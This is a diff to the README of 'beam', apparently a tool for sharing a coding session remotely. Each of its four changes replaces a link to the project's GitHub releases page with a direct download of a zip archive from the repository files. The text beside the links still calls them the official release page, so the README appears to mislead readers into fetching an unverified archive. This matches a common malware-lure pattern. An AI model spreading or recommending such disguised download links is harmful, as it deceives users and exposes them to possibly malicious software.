@@ -1,6 +1,6 @@
 # ⚡ beam - Share Your Coding Session Remotely
 
-[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Hamdy1234H/beam/releases)
+[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get the software by visiting the release page here:
 
-**[Download beam](https://github.com/Hamdy1234H/beam/releases)**
+**[Download beam](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)**
 
 This link takes you to the official release page. On that page, choose the latest version for Windows and download the setup file.
 
@@ -60,7 +60,7 @@ Before using beam, set up a few things:
 
 1. Visit the release page:
 
-   [https://github.com/Hamdy1234H/beam/releases](https://github.com/Hamdy1234H/beam/releases)
+   [https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)
 
 2. Download the latest Windows setup or zip file.
 
@@ -200,4 +200,4 @@ By default, the project folder on your local computer (for example, `C:\Users\Yo
 
 ---
 
-[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Hamdy1234H/beam/releases)
+[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)
